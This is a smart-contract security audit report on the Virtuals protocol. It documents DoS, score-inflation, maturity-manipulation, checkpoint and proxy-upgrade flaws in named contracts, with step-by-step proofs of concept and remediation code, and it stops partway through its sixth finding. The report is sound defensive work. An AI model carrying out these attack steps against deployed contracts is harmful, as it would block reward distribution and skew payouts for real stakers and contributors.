# Audit report — 2025-04-virtuals/H-05

## Finding 1: Unbounded Validator Set Growth via `ValidatorRegistry.validatorCount` Causes Denial of Service in Reward Distribution

### Synopsis

`ValidatorRegistry` tracks registered validators per `virtualId` in an unbounded array exposed via `validatorCount` (`ValidatorRegistry.sol:52-54`). Because `AgentNftV2.addValidator` is publicly callable without access control or stake requirements, an attacker can inflate the validator registry cardinality and permanently DoS `AgentRewardV2.distributeRewardsForAgents` and `ValidatorRegistry.totalUptimeScore` via gas exhaustion.

### Technical details

In `contracts/virtualPersona/ValidatorRegistry.sol`, validators for a given `virtualId` are stored in the dynamic array `_validators[virtualId]`, and its length is returned directly by `validatorCount`:

```solidity
function validatorCount(uint256 virtualId) public view returns (uint256) {
    return _validators[virtualId].length;
}
```

When a validator is registered through `AgentNftV2.addValidator(uint256 virtualId, address validator)` (`AgentNftV2.sol:133-139`), the function checks only whether the address is already a validator (`isValidator(virtualId, validator)`) and then invokes `_addValidator(virtualId, validator)` (`ValidatorRegistry.sol:30-34`) and `_initValidatorScore(virtualId, validator)` (`ValidatorRegistry.sol:36-38`):

```solidity
function addValidator(uint256 virtualId, address validator) public {
    if (isValidator(virtualId, validator)) {
        return;
    }
    _addValidator(virtualId, validator);
    _initValidatorScore(virtualId, validator);
}
```

`AgentNftV2.addValidator` has no role restriction (such as `onlyRole(VALIDATOR_ADMIN_ROLE)`) and enforces no minimum voting power or stake threshold on `validator`. Consequently, any external caller can repeatedly register arbitrary, distinct addresses as validators for any `virtualId`, causing `_validators[virtualId]` and `validatorCount(virtualId)` (`ValidatorRegistry.sol:52-54`) to grow without bound.

Downstream functions iterate over the entire validator set bounded by `validatorCount(virtualId)`:

1. **Reward distribution (`AgentRewardV2._distributeValidatorRewards`, lines 223-250):**
   Called during `distributeRewardsForAgents` -> `_distributeAgentRewards`. For each validator index `0 .. validatorCount - 1`, it performs multiple external calls (`nft.validatorAt`, `nft.virtualInfo`, `IERC5805(stakingAddress).getVotes`, and `nft.validatorScore` -> `ValidatorRegistry.validatorScore` -> `IAgentDAO(info.dao).scoreOf`) and storage writes (`_validatorRewards[validator][rewardId]` and `validatorPoolRewards`).
2. **Uptime aggregation (`ValidatorRegistry.totalUptimeScore`, lines 60-66):**
   Iterates `0 .. validatorCount(virtualId) - 1`, calling `validatorAt` and `validatorScore` (which performs an external call to the DAO contract via `_getScoreOf`) on every iteration.

Once `validatorCount(virtualId)` becomes sufficiently large, the gas required to iterate through all entries exceeds the block gas limit, causing `distributeRewardsForAgents` and `totalUptimeScore` to revert with out-of-gas errors.

### Assumptions and preconditions

- A valid virtual persona (`virtualId`) has been minted in `AgentNftV2`.
- An unprivileged attacker has enough native gas tokens to submit transactions registering dummy validator addresses for `virtualId`.

### Proof of concept

1. Suppose a valid agent with `virtualId = 1` exists and has active stakers and validators expecting rewards via `AgentRewardV2.distributeRewardsForAgents`.
2. An unprivileged attacker deploys a helper contract or submits batched transactions calling `AgentNftV2.addValidator(1, address(uint160(i)))` for thousands of distinct addresses `i`.
3. Each call succeeds because `isValidator(1, addr)` is `false` and `addValidator` has no access control or minimum stake requirement, appending `addr` to `_validators[1]` and initializing `_baseValidatorScore[addr][1]` (`ValidatorRegistry.sol:37`).
4. `ValidatorRegistry.validatorCount(1)` (`ValidatorRegistry.sol:52-54`) now returns a large number (e.g., `5,000`).
5. When governance calls `AgentRewardV2.distributeRewardsForAgents(mainRewardIndex, [1])`, execution enters `_distributeValidatorRewards` (`AgentRewardV2.sol:223-250`), which loops `5,000` times performing multiple external calls (`validatorAt`, `getVotes`, `validatorScore` -> `dao.scoreOf`) and storage accesses per validator.
6. The transaction exceeds the block gas limit and reverts, blocking reward distribution for `virtualId = 1`.

### Impact assessment

- **Severity:** High / Medium (Denial of Service of core protocol reward distribution).
- **Technical Impact:** `AgentRewardV2.distributeRewardsForAgents` (for any batch containing the affected `virtualId`) and `ValidatorRegistry.totalUptimeScore(virtualId)` permanently revert due to out-of-gas errors because there is no mechanism to remove validators or paginate the loop.
- **Business Impact:** Legitimate validators, stakers, and dataset/model contributors for the targeted `virtualId` are unable to receive their rewards in `AgentRewardV2`.

### Remediation

Enforce a maximum cap on the number of validators per `virtualId` or restrict validator registration and active validator counting to authorized/eligible accounts (e.g., enforcing access control on `addValidator` and/or capping registry cardinality in `ValidatorRegistry`).

```solidity
    uint256 public constant MAX_VALIDATORS = 100;

    function _initValidatorScore(uint256 virtualId, address validator) internal {
        require(_validators[virtualId].length <= MAX_VALIDATORS, "Max validators reached");
        _baseValidatorScore[validator][virtualId] = _getMaxScore(virtualId);
    }

    function validatorScore(uint256 virtualId, address validator) public view virtual returns (uint256) {
        return _baseValidatorScore[validator][virtualId] + _getScoreOf(virtualId, validator);
    }

    function getPastValidatorScore(
        uint256 virtualId,
        address validator,
        uint256 timepoint
    ) public view virtual returns (uint256) {
        return _baseValidatorScore[validator][virtualId] + _getPastScore(virtualId, validator, timepoint);
    }

    function validatorCount(uint256 virtualId) public view returns (uint256) {
        return _validators[virtualId].length;
    }
```

Additionally, restrict `AgentNftV2.addValidator` so that only authorized callers (such as `VALIDATOR_ADMIN_ROLE` or the `veToken` contract upon actual staking) can register new validators.

## Finding 2: Unconditional Score Increment in `AgentDAO._castVote` Allows Validator Score Inflation Beyond Total Proposals

### Synopsis

`AgentDAO._castVote` increments a voter's participation score (`_scores[account]`) and `_totalScore` without verifying whether the voter is a registered validator or holds voting power (`weight > 0`). This allows accounts to inflate their `validatorScore` beyond `totalProposals`, causing reward distribution in `AgentRewardV2` to revert via arithmetic underflow.

### Technical details

In `AgentDAO._castVote` (`contracts/virtualPersona/AgentDAO.sol`, lines 125–148), whenever an account casts a non-deliberate vote (`support` of `0`, `1`, or `2`) for the first time on an active proposal, the contract unconditionally increments `_totalScore` and pushes an incremented score checkpoint to `_scores[account]`:

```solidity
if (!votedPreviously && hasVoted(proposalId, account)) {
    ++_totalScore;
    _scores[account].push(SafeCast.toUint48(block.number), SafeCast.toUint208(scoreOf(account)) + 1);
    if (params.length > 0 && support == 1) {
        _updateMaturity(account, proposalId, weight, params);
    }
}
```

OpenZeppelin's `GovernorUpgradeable._castVote` does not require a voter to have non-zero voting weight (`weight > 0`), and `AgentDAO._castVote` does not check whether `account` is a registered validator in `AgentNftV2` (or had validator status / voting power at `proposalSnapshot(proposalId)`).

This conflicts with the validator scoring mechanism in `ValidatorRegistry` (`contracts/virtualPersona/ValidatorRegistry.sol`) and `AgentNftV2` (`contracts/virtualPersona/AgentNftV2.sol`):
1. When an address is registered as a validator via `AgentNftV2.addValidator(virtualId, validator)` (either called directly, as it is `public`, or triggered during `veToken.stake`), `_initValidatorScore` sets `_baseValidatorScore[validator][virtualId] = totalProposals(virtualId)`. This baseline is intended to credit newly onboarded validators for proposals created prior to their registration so their participation rate starts at 100%.
2. `ValidatorRegistry.validatorScore(virtualId, validator)` and `getPastValidatorScore(virtualId, validator, timepoint)` compute the validator's total score as:
   $$\text{validatorScore} = \text{\_baseValidatorScore}[\text{validator}][\text{virtualId}] + \text{dao.scoreOf}(\text{validator})$$

Because `AgentDAO._castVote` allows any address to increment `_scores[account]` with zero voting weight and without being a validator:
- **Pre-registration voting:** A non-validator account can vote on $k \ge 1$ proposals in `AgentDAO`, reaching `scoreOf(account) == k`. When the account subsequently registers as a validator via `addValidator`, `_baseValidatorScore` is set to `totalProposals`. Its resulting `validatorScore` becomes `totalProposals + k > totalProposals`.
- **Mid-proposal registration:** When a proposal is created in `_propose`, `proposalCount()` (`totalProposals`) is immediately incremented. If an account registers as a validator while that proposal is still `Active`, `_baseValidatorScore` is initialized to the already-incremented `totalProposals`. If the validator then casts a vote on that active proposal (with `weight == 0` at `proposalSnapshot`), `scoreOf(account)` increments by `1`, again making `validatorScore = totalProposals + 1 > totalProposals`.

When `validatorScore(virtualId, validator) > totalProposals(virtualId)`, `AgentRewardV2._distributeValidatorRewards` (`contracts/AgentRewardV2.sol`, lines 243–248) computes:

```solidity
uint256 participationReward = totalProposals == 0
    ? 0
    : (validatorRewards * nft.validatorScore(virtualId, validator)) / totalProposals;
_validatorRewards[validator][rewardId] = participationReward;

validatorPoolRewards += validatorRewards - participationReward;
```

For any validator with non-zero `validatorRewards` (`votes > 0`), `participationReward > validatorRewards`, causing `validatorRewards - participationReward` at line 248 to revert with an arithmetic underflow (Panic `0x11`). In `AgentRewardV3.getClaimableStakerRewards`, zero-weight accounts can similarly accumulate `dao.getPastScore` on proposals without holding or being delegated any `veToken` stake.

### Assumptions and preconditions

1. At least one governance proposal has been created in `AgentDAO` (`totalProposals >= 1`).
2. An account that is not yet a registered validator casts a vote on an active proposal (or registers as a validator after a proposal is created and then votes on that active proposal).
3. The account becomes a validator with non-zero delegated voting power (`votes > 0`) when validator rewards are distributed.

### Proof of concept

1. Proposal 1 is created in `AgentDAO`. `dao.proposalCount()` (`agentNft.totalProposals(virtualId)`) is now `1`.
2. Account `A` (which is not yet a validator and has `0` `veToken` voting power) calls `agentDAO.castVote(proposalId, 1)`.
3. In `AgentDAO._castVote`, `super._castVote` records `hasVoted[proposalId][A] = true` with `weight = 0`. Line 137 updates `_scores[A]` to `1`.
4. Account `A` becomes a validator with delegated voting power (e.g., a staker delegates `veToken` to `A` or calls `agentNft.addValidator(virtualId, A)` and delegates `veToken` to `A`).
5. `AgentNftV2.addValidator` invokes `_initValidatorScore(virtualId, A)`, setting `_baseValidatorScore[A][virtualId] = totalProposals(virtualId) = 1`.
6. `agentNft.validatorScore(virtualId, A)` now evaluates to `_baseValidatorScore[A][virtualId] + dao.scoreOf(A) = 1 + 1 = 2`, while `agentNft.totalProposals(virtualId)` is `1`.
7. When `AgentRewardV2._distributeValidatorRewards` is executed for `virtualId`, for validator `A`:
   - `validatorRewards = (amount * votes) / totalStaked > 0`
   - `participationReward = (validatorRewards * 2) / 1 = 2 * validatorRewards`
   - `validatorPoolRewards += validatorRewards - participationReward` reverts due to arithmetic underflow (`validatorRewards < participationReward`), blocking reward distribution for the entire virtual persona.

### Impact assessment

- **Severity:** High
- **Technical Impact:** Any user or validator can cause `validatorScore(virtualId, validator)` to exceed `totalProposals(virtualId)`, which triggers a deterministic arithmetic underflow in `AgentRewardV2._distributeValidatorRewards`, permanently blocking validator reward distribution for that `virtualId`, and corrupts participation score accounting (`_scores`, `_totalScore`, `totalUptimeScore`) across `AgentDAO`, `ValidatorRegistry`, and `AgentRewardV3`.
- **Business Impact:** Reward distribution for validators of an agent persona can be griefed or accidentally bricked during normal onboarding of new validators while a proposal is active.

### Remediation

Only award participation score in `AgentDAO._castVote` when the voter is a registered validator (and/or has non-zero voting weight at the proposal snapshot, ensuring the validator was active before the proposal snapshot was taken).

```solidity
    function _castVote(
        uint256 proposalId,
        address account,
        uint8 support,
        string memory reason,
        bytes memory params
    ) internal override returns (uint256) {
        bool votedPreviously = hasVoted(proposalId, account);

        uint256 weight = super._castVote(proposalId, account, support, reason, params);

        uint256 virtualId = IAgentNft(_agentNft).stakingTokenToVirtualId(address(token()));
        if (!votedPreviously && hasVoted(proposalId, account) && IAgentNft(_agentNft).isValidator(virtualId, account) && weight > 0) {
            ++_totalScore;
            _scores[account].push(SafeCast.toUint48(block.number), SafeCast.toUint208(scoreOf(account)) + 1);
            if (params.length > 0 && support == 1) {
                _updateMaturity(account, proposalId, weight, params);
            }
        }

        if (support == 1) {
            _tryAutoExecute(proposalId);
        }

        return weight;
    }
```

## Finding 3: Optional `params` Check in `AgentDAO._castVote` Skips `_updateMaturity` While Still Increasing `forVotes`, Corrupting Proposal Maturity Calculation

### Synopsis

In `AgentDAO._castVote`, `forVotes` is incremented for every `For` vote (`support == 1`), but `_updateMaturity` is only invoked when `params.length > 0`. Consequently, casting a `For` vote with empty `params` increases the `forVotes` denominator without updating `_proposalMaturities`, deflating `getMaturity(proposalId)`.

### Technical details

When a voter casts a `For` vote (`support == 1`) in `AgentDAO._castVote` (lines 125–148), execution proceeds as follows:

1. At line 133, `super._castVote(proposalId, account, support, reason, params)` invokes `GovernorCountingSimpleUpgradeable._countVote`, which unconditionally adds the voter's `weight` to `_proposalVotes[proposalId].forVotes` whenever `support == 1` (`VoteType.For`).
2. At lines 138–140, `AgentDAO._castVote` checks:
   ```solidity
   if (params.length > 0 && support == 1) {
       _updateMaturity(account, proposalId, weight, params);
   }
   ```
3. Inside `_updateMaturity`, for a model contribution proposal, the voter's calculated `maturity` is weighted by `weight` and added to `_proposalMaturities[proposalId]`:
   ```solidity
   _proposalMaturities[proposalId] += (maturity * weight);
   ```
4. Later, `AgentDAO.getMaturity(proposalId)` computes the weighted average maturity across all `For` votes:
   ```solidity
   (, uint256 forVotes, ) = proposalVotes(proposalId);
   return Math.min(10000, _proposalMaturities[proposalId] / forVotes);
   ```

Because `_updateMaturity` is gated by `params.length > 0`, any voter who votes `For` on a model contribution proposal via `castVote`, `castVoteWithReason`, `castVoteBySig`, or `castVoteWithReasonAndParams` with empty `params` (`""` / `0x`) has their voting `weight` added to the denominator (`forVotes`) while adding `0` to the numerator (`_proposalMaturities[proposalId]`).

This causes two concrete failures in maturity accounting:
- **Dilution / manipulation of weighted maturity:** Any `For` vote cast without `params` is effectively counted as a `0` maturity rating in `_proposalMaturities[proposalId] / forVotes`, dragging down the weighted average maturity below the minimum Elo rating achievable through legitimate battle outcomes in `EloCalculator.battleElo`.
- **Zero initial maturity for a core's first model (`coreService == 0`):** In `_calcMaturity`, the first model for a core (`coreService == 0`) is intended to start with a base maturity of `100` (`// All services start with 100 maturity`). However, if voters cast `For` votes with empty `params` (because no prior `coreService` exists to battle against), `_updateMaturity` is bypassed entirely and `getMaturity(proposalId)` evaluates to `0` instead of `100`.

### Assumptions and preconditions

1. An active model contribution proposal exists in `AgentDAO` (`IERC721(contributionNft).ownerOf(proposalId) != address(0)` and `IContributionNft(contributionNft).isModel(proposalId) == true`).
2. At least one voter with non-zero voting weight casts a `For` vote (`support == 1`) with empty `params` (e.g., via `castVote`, `castVoteWithReason`, `castVoteBySig`, or `castVoteWithReasonAndParams(..., "0x")`).

### Proof of concept

1. Suppose a model contribution proposal `proposalId` is created for a core whose current `coreService` has maturity `1000`.
2. Validator A (with voting weight `500e18`) evaluates the model, wins all 10 battles (`[1, 1, 1, 1, 1, 1, 1, 1, 1, 1]`), and calls `castVoteWithReasonAndParams(proposalId, 1, "", encodedBattles)`.
   - `EloCalculator.battleElo(1000, battles)` returns `1215`.
   - `_proposalMaturities[proposalId]` becomes `1215 * 500e18`.
   - `forVotes` becomes `500e18`.
3. Validator B (also with voting weight `500e18`) supports the proposal and calls `castVote(proposalId, 1)` (or `castVoteWithReasonAndParams(proposalId, 1, "", "0x")`), passing empty `params`.
   - `forVotes` increases to `1000e18`.
   - Because `params.length == 0`, line 138 skips `_updateMaturity`, leaving `_proposalMaturities[proposalId]` at `1215 * 500e18`.
4. When `getMaturity(proposalId)` is called, it computes:
   ```solidity
   (1215 * 500e18) / 1000e18 = 607
   ```
   The resulting maturity (`607`) is half of Validator A's evaluation and far below the current core service maturity (`1000`), despite both validators voting in favor of the model.

### Impact assessment

**Severity: Medium**

- **Technical Impact:** The weighted average maturity calculation in `AgentDAO.getMaturity(proposalId)` becomes inconsistent whenever any `For` voter omits `params`, because `forVotes` includes their voting weight while `_proposalMaturities[proposalId]` does not.
- **Business Impact:** Model Service NFTs minted from approved contribution proposals receive artificially deflated (or `0`) maturity scores, corrupting service impact weights, Elo progression for subsequent model proposals, and contributor reward distributions tied to service maturity/impact.

### Remediation

Require valid evaluation `params` whenever casting a `For` vote (`support == 1`) on a model contribution proposal (or unconditionally invoke `_updateMaturity` on `support == 1` and enforce non-empty `params` inside `_updateMaturity` when `coreService > 0`, while allowing `coreService == 0` to record the default `100` maturity even with empty `params`).

```solidity
    function _castVote(
        uint256 proposalId,
        address account,
        uint8 support,
        string memory reason,
        bytes memory params
    ) internal override returns (uint256) {
        bool votedPreviously = hasVoted(proposalId, account);

        uint256 weight = super._castVote(proposalId, account, support, reason, params);

        if (!votedPreviously && hasVoted(proposalId, account)) {
            ++_totalScore;
            _scores[account].push(SafeCast.toUint48(block.number), SafeCast.toUint208(scoreOf(account)) + 1);
            if (support == 1) {
                _updateMaturity(account, proposalId, weight, params);
            }
        }

        if (support == 1) {
            _tryAutoExecute(proposalId);
        }

        return weight;
    }
```

## Finding 4: Checkpoint Clock-Domain Mismatch in `AgentDAO._castVote` Corrupts Historical Validator Score Lookups

### Synopsis

In `AgentDAO._castVote`, validator participation checkpoints are written to `_scores[account]` using `SafeCast.toUint48(block.number)` as the checkpoint key, whereas `AgentDAO.getPastScore` and the underlying OpenZeppelin `GovernorVotesUpgradeable` module operate in the EIP-6372 `clock()` domain, corrupting historical score lookups and reward calculations whenever `clock()` diverges from `block.number`.

### Technical details

`AgentDAO` inherits from `GovernorVotesUpgradeable`, which implements EIP-6372 timepoint tracking via `clock()`:

```solidity
function clock() public view virtual override returns (uint48) {
    try token().clock() returns (uint48 timepoint) {
        return timepoint;
    } catch {
        return Time.blockNumber();
    }
}
```

Throughout `AgentDAO` and its inherited OpenZeppelin governance modules, timepoints and historical checkpoints are consistently indexed and validated using `clock()`:
- `AgentDAO.propose` (line 88) queries voting power at `clock() - 1`.
- `GovernorUpgradeable._propose` (line 345) computes proposal snapshots using `clock() + votingDelay()`.
- `GovernorVotesQuorumFractionUpgradeable._updateQuorumNumerator` (line 125) pushes quorum checkpoints using `clock()`.
- `AgentDAO.getPastScore` (lines 116–122) validates the requested `timepoint` against `clock()` and performs a binary search on `_scores[account]`:

```solidity
function getPastScore(address account, uint256 timepoint) external view returns (uint256) {
    uint48 currentTimepoint = clock();
    if (timepoint >= currentTimepoint) {
        revert ERC5805FutureLookup(timepoint, currentTimepoint);
    }
    return _scores[account].upperLookupRecent(SafeCast.toUint48(timepoint));
}
```

However, in `AgentDAO._castVote` (line 137), when recording a voter's participation score checkpoint in `_scores[account]`, the contract hardcodes `SafeCast.toUint48(block.number)` instead of calling `clock()`:

```solidity
if (!votedPreviously && hasVoted(proposalId, account)) {
    ++_totalScore;
    _scores[account].push(SafeCast.toUint48(block.number), SafeCast.toUint208(scoreOf(account)) + 1);
    if (params.length > 0 && support == 1) {
        _updateMaturity(account, proposalId, weight, params);
    }
}
```

This creates a clock-domain mismatch between checkpoint insertion (`block.number`) and checkpoint lookup/validation (`clock()`):

1. **Timestamp-based or faster `clock()` (`clock() > block.number`):** When the voting token (`veToken`) implements a timestamp-based EIP-6372 clock (e.g., `block.timestamp`) or a clock with values larger than `block.number`, `_scores[account].push` records checkpoints with small keys (`block.number`), while `getPastScore(account, timepoint)` is queried with historical timepoints in the `clock()` domain (or even if queried with a past timestamp $T$, `upperLookupRecent(T)` compares $T$ against checkpoint keys stored as `block.number`). Since `block.number < T` holds even for votes cast *after* timestamp $T$, `getPastScore(account, T)` erroneously includes all future votes cast by `account` after $T$, inflating historical `uptime` in `AgentRewardV3.getClaimableStakerRewards` and `AgentNftV2.getPastValidatorScore`.
2. **Slower `clock()` (`clock() < block.number`):** On chains or token implementations where `clock()` returns a value smaller than `block.number` (e.g., L1 block number vs. L2 block number, or epoch-based clocks), querying `getPastScore` at a checkpoint key written by `_castVote` reverts with `ERC5805FutureLookup(timepoint, currentTimepoint)`. Furthermore, if the voting token is migrated via `AgentNftV2.migrateVirtual` to a token whose `clock()` returns a timepoint smaller than previously recorded `block.number` keys, any subsequent `_castVote` call attempting to push with a key smaller than the latest checkpoint key would revert with `CheckpointUnorderedInsertion`.

### Assumptions and preconditions

- The DAO's voting token (`token()`), configured during initialization or updated via `AgentNftV2.migrateVirtual`, implements EIP-6372 `clock()` returning a timepoint that differs from `uint48(block.number)` (such as `uint48(block.timestamp)` or an L1/custom block counter).
- A voter casts a vote on an active proposal in `AgentDAO`, triggering `_castVote`.

### Proof of concept

1. `AgentDAO` is initialized (or migrated via `AgentNftV2.migrateVirtual`) with a voting token that implements EIP-6372 using `block.timestamp` as its `clock()` (e.g., `clock() == 1_700_000_000` while `block.number == 19_000_000`).
2. At timestamp `T_1 = 1_700_000_100` (`block.number = 19_000_010`), a reward snapshot is created at timepoint `T_1`. At this moment, validator `V` has not voted on any proposal, so `V`'s true historical score at `T_1` is `0`.
3. Later, at timestamp `T_2 = 1_700_000_500` (`block.number = 19_000_050`), validator `V` casts a vote on an active proposal via `castVote`.
4. `AgentDAO._castVote` executes line 137:
   `_scores[V].push(SafeCast.toUint48(block.number), 1)`
   which stores checkpoint `(_key: 19_000_050, _value: 1)`.
5. When `dao.getPastScore(V, T_1)` is called for the earlier snapshot `T_1 = 1_700_000_100`:
   - `T_1 < clock()` (`1_700_000_100 < 1_700_000_500`), so the `ERC5805FutureLookup` check passes.
   - `_scores[V].upperLookupRecent(1_700_000_100)` compares `_key (19_000_050) <= 1_700_000_100`, which evaluates to `true`.
6. `getPastScore(V, T_1)` returns `1` instead of `0`, retroactively crediting `V` (and stakers delegating to `V`) for votes cast after the snapshot timepoint `T_1`, and potentially causing `uptime > agentReward.totalProposals` for past reward epochs.

### Impact assessment

- **Severity:** Medium
- **Technical Effect:** Historical participation checkpoints in `_scores` are stored in the `block.number` domain instead of the `clock()` domain used by `getPastScore` and the rest of the governance system.
- **Business Impact:** Historical validator score queries (`getPastScore` / `getPastValidatorScore`) return inaccurate future scores for past snapshots or revert unexpectedly when `clock()` does not equal `block.number`, leading to miscalculated staker and validator rewards (including potential over-distribution of rewards when retroactive votes inflate past `uptime` above `agentReward.totalProposals`).

### Remediation

Use `clock()` instead of `SafeCast.toUint48(block.number)` when pushing score checkpoints in `AgentDAO._castVote` so that checkpoint keys use the same EIP-6372 clock domain as `getPastScore` and the rest of the `Governor` contract.

```solidity
    function _castVote(
        uint256 proposalId,
        address account,
        uint8 support,
        string memory reason,
        bytes memory params
    ) internal override returns (uint256) {
        bool votedPreviously = hasVoted(proposalId, account);

        uint256 weight = super._castVote(proposalId, account, support, reason, params);

        if (!votedPreviously && hasVoted(proposalId, account)) {
            ++_totalScore;
            _scores[account].push(clock(), SafeCast.toUint208(scoreOf(account)) + 1);
            if (params.length > 0 && support == 1) {
                _updateMaturity(account, proposalId, weight, params);
            }
        }

        if (support == 1) {
            _tryAutoExecute(proposalId);
        }

        return weight;
    }
```

## Finding 5: Lack of Evaluation Payload Validation in `AgentDAO._castVote` Allows Voters to Inflate Proposal Maturity Scores

### Synopsis

In `AgentDAO._castVote`, caller-supplied `params` are forwarded to `_updateMaturity` whenever `params.length > 0 && support == 1` without validating the decoded `uint8[]` battle results array. A voter can supply an oversized array of wins in `params` to artificially inflate `_proposalMaturities[proposalId]` and manipulate `getMaturity(proposalId)`.

### Technical details

When a voter casts a `For` vote (`support == 1`) on a proposal via `castVoteWithReasonAndParams` or `castVoteWithReasonAndParamsBySig`, `AgentDAO._castVote` executes:

```solidity
if (!votedPreviously && hasVoted(proposalId, account)) {
    ++_totalScore;
    _scores[account].push(SafeCast.toUint48(block.number), SafeCast.toUint208(scoreOf(account)) + 1);
    if (params.length > 0 && support == 1) {
        _updateMaturity(account, proposalId, weight, params);
    }
}
```

`_updateMaturity` decodes `params` directly into `uint8[] memory votes = abi.decode(params, (uint8[]))` and passes `votes` to `_calcMaturity(proposalId, votes)`. When an existing `coreService` is present (`coreService > 0`), `_calcMaturity` queries the current service maturity and passes `votes` to `EloCalculator.battleElo(maturity, votes)`:

```solidity
function battleElo(uint256 currentRating, uint8[] memory battles) public view returns (uint256) {
    uint256 eloA = 1000;
    uint256 eloB = 1000;
    for (uint256 i = 0; i < battles.length; i++) {
        uint256 result = mapBattleResultToGameResult(battles[i]);
        (uint256 change, bool negative) = Elo.ratingChange(eloB, eloA, result, k);
        change = _roundUp(change, 100);
        if (negative) {
            eloA -= change;
            eloB += change;
        } else {
            eloA += change;
            eloB -= change;
        }
    }
    return currentRating + eloA - 1000;
}
```

As reflected in the test suite (`test/elo.js`), the Elo battle evaluation is intended to process a fixed-size array of 10 battle outcomes (e.g., `[1, 1, 1, 1, 1, 1, 1, 1, 1, 1]`), where 10 consecutive wins (`1`) with `k = 30` increases `eloA` from `1000` to `1215` (`+215` rating points, raising a base maturity of `100` to `315`).

However, neither `_castVote` nor `_updateMaturity` (nor `_calcMaturity` or `battleElo`) validates the length or element values of the decoded `votes` array in `params`:
1. Because `battleElo` iterates over `battles.length` without any upper bound and passes `(eloB, eloA)` to `Elo.ratingChange`, each additional `1` in `votes` continues to increase `eloA` by `26` to `30` points (and decrease `eloB` by the same amount) as long as `eloB >= change`.
2. By supplying 37 consecutive `1`s in `params` instead of 10, a voter increases `eloA` from `1000` to `1990` (`+990` rating points instead of `+215`), boosting a base `100` maturity to `1090` (more than 3.4x the maximum intended maturity of `315`, and 4.6x the maximum intended Elo delta).
3. `_updateMaturity` then accumulates `_proposalMaturities[proposalId] += (maturity * weight)`, and `getMaturity(proposalId)` computes `_proposalMaturities[proposalId] / forVotes` (capped at `10000`). Consequently, a single voter with voting weight can disproportionately skew the proposal's final maturity score upward.

### Assumptions and preconditions

1. An active model contribution proposal (`isModel(proposalId) == true`) exists for an agent persona where a prior `coreService` has already been established (`coreService > 0`).
2. A voter holds non-zero voting power (`weight > 0`) at `proposalSnapshot(proposalId)` and casts a `For` vote (`support == 1`) via `castVoteWithReasonAndParams` or `castVoteWithReasonAndParamsBySig`.

### Proof of concept

1. Suppose a virtual persona has an active `coreService` for core type `0` with `maturity = 100`.
2. A new model contribution proposal `proposalId` is created for core type `0`.
3. Honest validators holding `50%` of the voting weight (`weight = 50e18`) evaluate the model with 10 losses/draws such that their calculated `maturity` is `100` (`eloA = 1000`), adding `100 * 50e18 = 5000e18` to `_proposalMaturities[proposalId]`.
4. Another voter holding the remaining `50%` of the voting weight (`weight = 50e18`) calls `castVoteWithReasonAndParams(proposalId, 1, "", params)` where `params` encodes a `uint8[]` array of 37 `1`s (`[1, 1, ..., 1]`).
5. Inside `_castVote` -> `_updateMaturity` -> `_calcMaturity` -> `battleElo(100, votes)`:
   - Instead of stopping after 10 battles (which would yield `maturity = 315` and a weighted average maturity of `(100 + 315) / 2 = 207`), `battleElo` processes all 37 wins, raising `eloA` to `1990` and returning `maturity = 1090`.
   - `_proposalMaturities[proposalId]` is incremented by `1090 * 50e18 = 54500e18`.
6. When `getMaturity(proposalId)` is queried upon proposal execution, it returns `(5000e18 + 54500e18) / 100e18 = 595`, nearly triple the intended weighted average (`207`) and higher than even a unanimous 10-win evaluation (`315`).

### Impact assessment

- **Severity**: Medium / High
- **Technical Impact**: Any voter with non-zero voting weight can manipulate the Elo calculation for model contribution proposals by passing an oversized `uint8[]` battle array in `params`, bypassing the intended 10-battle Elo bounds and inflating `getMaturity(proposalId)`.
- **Business Impact**: Because service maturity directly determines the `ServiceNft` impact score upon minting, artificially inflated maturity values corrupt model quality rankings and allow contributors to claim a disproportionately larger share of protocol contributor rewards.

### Remediation

Validate the decoded evaluation payload before processing it in `_castVote` / `_updateMaturity` by enforcing the expected number of battles (e.g., requiring the decoded `uint8[]` array to have the exact expected length and valid battle result values `[0, 1, 2, 3]`):

```solidity
    function _castVote(
        uint256 proposalId,
        address account,
        uint8 support,
        string memory reason,
        bytes memory params
    ) internal override returns (uint256) {
        bool votedPreviously = hasVoted(proposalId, account);

        uint256 weight = super._castVote(proposalId, account, support, reason, params);

        if (!votedPreviously && hasVoted(proposalId, account)) {
            ++_totalScore;
            _scores[account].push(SafeCast.toUint48(block.number), SafeCast.toUint208(scoreOf(account)) + 1);
            if (params.length > 0 && support == 1) {
                uint8[] memory votes = abi.decode(params, (uint8[]));
                require(votes.length == 10, "Invalid votes length");
                for (uint256 i = 0; i < votes.length; i++) {
                    require(votes[i] <= 3, "Invalid battle result");
                }
                _updateMaturity(account, proposalId, weight, params);
            }
        }

        if (support == 1) {
            _tryAutoExecute(proposalId);
        }

        return weight;
    }
```

## Finding 6: Storing Internal Function Pointers in `AgentNftV2.initialize` Breaks Validator Score Callbacks Across Proxy Upgrades

### Synopsis

In `AgentNftV2.initialize`, internal function pointers (`_validatorScoreOf`, `totalProposals`, and `_getPastValidatorScore`) are persisted into proxy storage via `__ValidatorRegistry_init`. Because Solidity encodes internal function pointers as implementation-specific bytecode offsets, upgrading the proxy invalidates these stored callbacks, causing validator score queries, staking, and reward distribution to fail or jump to unintended code.

### Technical details

`AgentNftV2` is an upgradeable contract inheriting from `ValidatorRegistry`. In `AgentNftV2.initialize` (line 65), the contract initializes `ValidatorRegistry` by passing three internal function references:

```solidity
__ValidatorRegistry_init(_validatorScoreOf, totalProposals, _getPastValidatorScore);
```

In `ValidatorRegistry.sol` (lines 12–24), these callbacks are stored in contract storage variables:

```solidity
function(uint256, address) view returns (uint256) private _getScoreOf;
function(uint256) view returns (uint256) private _getMaxScore;
function(uint256, address, uint256) view returns (uint256) private _getPastScore;
```

In Solidity, a storage variable of an internal function type stores the runtime program counter (PC) offset (or internal function tag ID) corresponding to the function's entry `JUMPDEST` in the compiled bytecode of the implementation contract that was active when `__ValidatorRegistry_init` executed.

When the `AgentNft` proxy is upgraded to a new implementation (such as `AgentNftV2` or any subsequent version), any modification to the contract's code changes the compiler-generated bytecode offsets and jump tags. However:
1. The proxy's storage retains the old bytecode offsets written during the initial `initialize` call.
2. `initialize` is protected by the `initializer` modifier (version 1) and cannot be invoked again on an already-initialized proxy during an upgrade.
3. Even though `AgentNftV2` introduces `migrateScoreFunctions()` gated by `onlyRole(ADMIN_ROLE)`, `ADMIN_ROLE` is only granted inside `initialize` (line 69), which is not executed on upgrade. Thus, after an upgrade, the stored function pointers remain stale until `DEFAULT_ADMIN_ROLE` manually grants `ADMIN_ROLE` and calls `migrateScoreFunctions()`.

